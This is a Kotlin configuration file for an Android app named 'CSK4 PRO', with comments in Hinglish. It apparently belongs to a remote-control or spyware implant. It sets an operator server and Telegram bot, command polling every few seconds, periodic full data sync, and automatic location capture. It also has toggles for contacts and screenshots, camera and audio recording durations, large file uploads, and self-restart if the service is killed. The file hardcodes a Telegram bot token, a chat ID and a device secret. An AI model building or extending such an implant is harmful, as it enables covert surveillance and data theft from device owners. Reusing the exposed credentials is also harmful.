package com.csk4.app

/**
 * ============================================
 * CSK4 PRO v4.0 - Configuration
 * ============================================
 * Ye file saari settings hold karti hai
 * 
 * ⚠️ IMPORTANT:
 * - SERVER_URL apna Render URL daalein
 * - Backup URL bhi daalein (agar hai)
 * - Telegram bot token daalein
 * ============================================
 */
object Config {

    // ============ SERVER ============
    // ⚠️ Primary Server URL (HTTPS)
    const val SERVER_URL = "https://csk4-project-server.onrender.com"

    // ⚠️ Backup Server URL (agar primary down ho)
    // Agar koi doosra server hai to yahan daalein
    // Warna same URL rakhein
    const val BACKUP_SERVER_URL = "https://csk4-project-server.onrender.com"

    // Admin panel URL
    const val ADMIN_PANEL_URL = "$SERVER_URL/"

    // ============ AUTHENTICATION ============
    // ⚠️ Device Token (server.js se match hona chahiye)
    const val DEVICE_TOKEN = "CSK4-DEVICE-SECRET-123"

    // ============ TELEGRAM ============
    // Bot token (Telegram se)
    const val TELEGRAM_BOT_TOKEN = "8393657326:AAFvHQjOcbgKqcMpiFn8lQbZtc3VipPXUvI"

    // Chat ID (aapki personal chat)
    const val TELEGRAM_CHAT_ID = "8181910370"

    // ============ TIMING ============
    // Command polling interval (ms)
    const val COMMAND_POLL_INTERVAL = 8 * 1000L      // 8 seconds

    // Heartbeat interval (ms)
    const val HEARTBEAT_INTERVAL = 30 * 1000L        // 30 seconds

    // Full data sync interval (ms)
    const val SYNC_INTERVAL = 5 * 60 * 1000L         // 5 minutes

    // Offline queue sync retry interval
    const val OFFLINE_RETRY_INTERVAL = 60 * 1000L    // 1 minute

    // ============ SERVICE ============
    // Foreground service notification ID
    const val NOTIFICATION_ID = 1

    // Notification channel ID
    const val NOTIFICATION_CHANNEL_ID = "csk4_service"

    // Notification channel name
    const val NOTIFICATION_CHANNEL_NAME = "CSK4 Service"

    // WorkManager unique name
    const val WORK_MANAGER_TAG = "csk4_worker"

    // Auto-restart alarm request code
    const val RESTART_ALARM_CODE = 4001

    // Restart interval (ms) - if service killed
    const val AUTO_RESTART_INTERVAL = 15 * 60 * 1000L  // 15 minutes

    // ============ NETWORK ============
    // HTTP timeout (ms)
    const val HTTP_TIMEOUT = 30000L                   // 30 seconds

    // Max retry attempts
    const val MAX_RETRY = 5

    // Retry delay (ms)
    const val RETRY_DELAY = 2000L                     // 2 seconds

    // ============ STORAGE ============
    // Local DB name
    const val DB_NAME = "csk4_offline.db"

    // DB version
    const val DB_VERSION = 1

    // Max local queue size
    const val MAX_LOCAL_QUEUE = 10000

    // Max file upload size (bytes)
    const val MAX_FILE_SIZE = 100 * 1024 * 1024       // 100 MB

    // ============ CAMERA/VIDEO ============
    // Default video duration (seconds)
    const val VIDEO_DURATION = 10

    // Default audio duration (seconds)
    const val AUDIO_DURATION = 10

    // ============ LOGGING ============
    // Enable debug logs
    const val DEBUG = true

    // Log tag
    const val TAG = "CSK4"

    // ============ FEATURES ============
    // Enable auto-screenshot
    const val ENABLE_AUTO_SCREENSHOT = false

    // Enable auto-location
    const val ENABLE_AUTO_LOCATION = true

    // Enable auto-contacts sync
    const val ENABLE_AUTO_CONTACTS = false

    // Enable encryption
    const val ENABLE_ENCRYPTION = false

    // ============ HELPER FUNCTIONS ============

    /**
     * Server URL get karein (with fallback)
     */
    fun getServerUrl(useBackup: Boolean = false): String {
        return if (useBackup && BACKUP_SERVER_URL.isNotEmpty()) {
            BACKUP_SERVER_URL
        } else {
            SERVER_URL
        }
    }

    /**
     * Full API endpoint URL banayein
     */
    fun api(path: String): String {
        return "$SERVER_URL/api/$path"
    }

    /**
     * Full API endpoint URL banayein (with backup)
     */
    fun apiWithFallback(path: String): List<String> {
        val urls = mutableListOf("$SERVER_URL/api/$path")
        if (BACKUP_SERVER_URL.isNotEmpty() && BACKUP_SERVER_URL != SERVER_URL) {
            urls.add("$BACKUP_SERVER_URL/api/$path")
        }
        return urls
    }

    /**
     * Config validation
     */
    fun isConfigured(): Boolean {
        return SERVER_URL.isNotEmpty() &&
               DEVICE_TOKEN.isNotEmpty()
    }

    /**
     * Get summary
     */
    fun getSummary(): String {
        return """
            CSK4 Config:
            Server: $SERVER_URL
            Backup: $BACKUP_SERVER_URL
            Telegram: ${if (TELEGRAM_BOT_TOKEN.isNotEmpty()) "✅" else "❌"}
            Auth: ${if (DEVICE_TOKEN.isNotEmpty()) "✅" else "❌"}
            Debug: $DEBUG
        """.trimIndent()
    }
}
